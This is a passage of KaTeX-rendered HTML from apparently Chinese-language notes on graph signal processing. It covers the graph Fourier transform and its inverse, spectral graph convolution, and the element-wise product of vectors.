style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68889em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span></span></span></span></span></span></span> 的图傅里叶变换定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover><mo>=</mo><msup><mi>U</mi><mi>T</mi></msup><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">\\hat{x}=U^Tx\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8913309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span></span></span></span></span></p>\n<p>这里，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>U</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">U^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span> 是特征向量矩阵的转置，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 是图上的信号（每个节点上的值构成的向量），<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\hat x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span></span></span></span> 是信号的图傅里叶变换（频域表示）</p>\n</li>\n<li>\n<p>逆变换：图傅里叶逆变换将频域表示的信号转换回时域表示，定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>x</mi><mo>=</mo><mi>U</mi><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover></mrow><annotation encoding=\"application/x-tex\">x=U \\hat x\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span></span></span></span></span></p>\n<p>这里，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span> 是特征向量矩阵，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\hat  x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span></span></span></span> 是频域表示的信号</p>\n</li>\n</ul>\n<h3 id=\"图卷积\"><a class=\"anchor\" href=\"#图卷积\">#</a> 图卷积</h3>\n<p>在图信号处理（Graph Signal Processing）中，卷积操作可以通过谱域（频域）中的计算来简化。</p>\n<p>根据卷积定理，给定输入信号 x 和滤波信号 y，图卷积<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>∗</mo><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">*G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">∗</span><span class=\"mord mathnormal\">G</span></span></span></span> 可以写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>x</mi><msub><mo>∗</mo><mi>G</mi></msub><mi>y</mi><mo>=</mo><mi>U</mi><mrow><mo fence=\"true\">(</mo><mo stretchy=\"false\">(</mo><msup><mi>U</mi><mi>T</mi></msup><mi>x</mi><mo stretchy=\"false\">)</mo><mo>⊙</mo><mo stretchy=\"false\">(</mo><msup><mi>U</mi><mi>T</mi></msup><mi>y</mi><mo stretchy=\"false\">)</mo><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">x *_G y=U\\left((U^Tx)\\odot(U^Ty)\\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61528em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mbin\">∗</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2413409999999998em;vertical-align:-0.35001em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">(</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size1\">)</span></span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span> 是图拉普拉斯矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 的特征向量矩阵</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>U</mi><mi>x</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">U^T_x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.088331em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span> 是信号<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的图傅里叶变换（频域表示）</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>U</mi><mi>y</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">U^T_y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2244389999999998em;vertical-align:-0.383108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.383108em;\"><span></span></span></span></span></span></span></span></span></span> 是滤波器<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 的图傅里叶变换（频域表示）</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>⊙</mo></mrow><annotation encoding=\"application/x-tex\">\\odot</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">⊙</span></span></span></span> 表示逐点乘积（点乘）</li>\n</ul>\n<p><strong>步骤</strong>：</p>\n<ul>\n<li>对信号<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 进行图傅里叶变换<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>U</mi><mi>T</mi></msup><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">U^Tx</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span></span></span></span></li>\n<li>在频域中，对转换后的信号<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>U</mi><mi>x</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">U_x^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.088331em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span> 和滤波器<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>U</mi><mi>y</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">U^T_y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2244389999999998em;vertical-align:-0.383108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.383108em;\"><span></span></span></span></span></span></span></span></span></span> 进行逐点乘积，结果表示为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mrow></mrow><msub><mi>g</mi><mi>θ</mi></msub><msup><mi>U</mi><mi>T</mi></msup><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">{}{g_{\\theta}}U^{T}x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.035771em;vertical-align:-0.19444em;\"></span><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span></span></span></span></li>\n<li>对频域结果进行图傅里叶逆变换，得到卷积结果<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>U</mi><msub><mi>g</mi><mi>θ</mi></msub></msub><msubsup><mi>U</mi><mi>x</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">U_{g _\\theta}U^T_x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1274389999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3487714285714287em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15122857142857138em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span></li>\n</ul>\n<h4 id=\"逐点积\"><a class=\"anchor\" href=\"#逐点积\">#</a> 逐点积</h4>\n<p>逐点乘积是指两个相同维度的矩阵或向量之间的元素对应相乘。假设有两个向量 $ a$ 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span>，其长度都为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>，则逐点乘积 $ c$ 的第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 个元素定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">c_i=a_i*b_i\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.61528em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>假设有两个向量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" 